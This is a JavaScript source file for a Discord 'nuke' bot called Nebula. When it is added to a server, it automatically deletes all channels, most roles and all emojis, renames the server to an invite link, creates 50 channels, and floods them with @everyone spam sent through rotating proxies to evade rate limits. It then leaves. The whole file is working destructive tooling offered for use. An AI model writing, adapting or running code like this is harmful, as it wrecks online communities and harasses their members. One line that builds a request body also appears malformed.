const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
dotenv.config();

// ====== PROXY SETUP (Supports https-proxy-agent v5/v6 and SOCKS5) ======
let HttpProxyAgent;
try {
  const agentModule = require('https-proxy-agent');
  HttpProxyAgent = typeof agentModule === 'function'
    ? agentModule
    : agentModule.HttpProxyAgent || agentModule.default;
} catch (err) {
  console.warn('⚠️ Could not load https-proxy-agent:', err.message);
}

const { SocksProxyAgent } = require('socks-proxy-agent');

let proxies = [];
let currentProxyIndex = 0;

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf-8');
    proxies = data
      .split(/\r?\n|\r/)
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.length > 5);
    console.log(`✅ Loaded ${proxies.length} proxies.`);
  } catch (err) {
    console.warn('⚠️ Could not read proxies.txt:', err.message);
    proxies = [];
  }
}

function getProxyAgent() {
  if (proxies.length === 0) return null;
  const proxy = proxies[currentProxyIndex];
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

  if (proxy.startsWith('socks5://')) {
    return new SocksProxyAgent(proxy);
  } else {
    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
  }
}

// Reload proxies every 5 minutes
setInterval(loadProxies, 5 * 60 * 1000);
loadProxies(); // Load on startup

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== CUSTOM REST REQUEST WITH PROXY ======
const rest = client.rest;
const originalRequest = rest.request.bind(rest);

rest.request = async function(options) {
  const agent = getProxyAgent();
  if (agent) {
    options.agent = { https: agent };
  }
  return await originalRequest(options);
};

// ====== WEB SERVER (Keep Alive) ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on port ${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 3) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 500);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
        retries++;
      } else {
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) return;
    await handleRateLimit(() => guild.leave(), 2);
    console.log('🚪 Left server successfully.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked.');
    } else {
      console.error('⚠️ Error leaving:', err.message);
    }
  }
}

// ====== ULTRA-FAST SPAM HELPER ======
async function sendWithProxy(channel, content, agent) {
  const rest = client.rest;
  const options = {
    method: 'POST',
    path: `/channels/${channel.id}/messages`,
     { content },
    versioned: true,
  };

  if (agent) {
    options.agent = { https: agent };
  }

  try {
    await rest.request(options);
  } catch (error) {
    if (error.code === 429) {
      console.debug(`Ratelimited on ${channel.id}: retry_after=${error.retry_after}`);
    }
    // Ignore other errors (proxy fail, timeout)
  }
}

// ====== BOT READY ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('Auto-nuking servers', { type: 'PLAYING' });
});

// ====== AUTO-NUKE ON JOIN (GUILD CREATE) ======
client.on('guildCreate', async (guild) => {
  console.log(`🚨 Joined new server: ${guild.name} (ID: ${guild.id}) - Auto-running .rip`);

  // 🔒 Protected server (your safe server)
  const BLOCKED_GUILD_ID = '1345474714331643956';
  if (guild.id === BLOCKED_GUILD_ID) {
    console.log('🔒 Protected server. Leaving...');
    await safeLeaveGuild(guild);
    return;
  }

  // Check permissions
  const me = await guild.members.fetch(client.user.id).catch(() => null);
  if (!me) return;

  const hasChannels = me.permissions.has('ManageChannels');
  const hasRoles = me.permissions.has('ManageRoles');
  if (!hasChannels || !hasRoles) {
    console.log(`❌ Missing permissions in ${guild.name}. Leaving...`);
    await safeLeaveGuild(guild);
    return;
  }

  try {
    const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
    const chName = 'neb-was-here';

    // === 1. Delete channels ===
    await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete(), 2)));

    // === 2. Delete roles ===
    await Promise.all(
      guild.roles.cache
        .filter(r => r.name !== '@everyone' && !r.managed)
        .map(r => handleRateLimit(() => r.delete(), 2))
    );

    // === 3. Delete emojis ===
    await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete(), 2)));

    // === 4. Rename server ===
    await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }), 2);

    // === 5. Create 50 channels ===
    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(
        () => guild.channels.create({ name: `${chName}-${i + 1}` }),
        2
      );
      if (ch) channels.push(ch);
    }

    if (channels.length === 0) {
      console.log('❌ No channels created. Leaving...');
      await safeLeaveGuild(guild);
      return;
    }

    console.log(`🔥 Spamming ${channels.length} channels with proxies...`);

    // === 6. SPAM: 20 messages per channel using 1 proxy each ===
    const spamStart = Date.now();
    const allSpamPromises = [];

    channels.forEach(channel => {
      const proxyAgent = getProxyAgent(); // 1 proxy per channel

      for (let i = 0; i < 20; i++) {
        allSpamPromises.push(
          sendWithProxy(channel, spamMsg, proxyAgent).catch(() => {})
        );
      }
    });

    // Fire all messages at once
    await Promise.allSettled(allSpamPromises);

    const duration = Date.now() - spamStart;
    console.log(`💥 Spammed ~${allSpamPromises.length} messages in ${duration}ms!`);

    // === 7. Leave server ===
    await safeLeaveGuild(guild);
  } catch (err) {
    console.error('❌ Auto-rip failed:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MANUAL COMMANDS (Optional: for debugging) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // Allow manual .help and .servers
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot')
      .setDescription('This bot auto-nukes servers on join.')
      .addFields({ name: '.help', value: 'Shows this message' })
      .setColor('#ff0000');
    try {
      await message.author.send({ embeds: [embed] });
      await message.reply('📬 Help sent!');
    } catch {
      await message.reply('❌ Enable DMs.');
    }
  }

  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') return;
    const list = client.guilds.cache.map(g => `🔹 ${g.name} (\`${g.id}\`)`).join('\n');
    await message.author.send(`🌐 In ${client.guilds.cache.size} servers:\n${list}`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
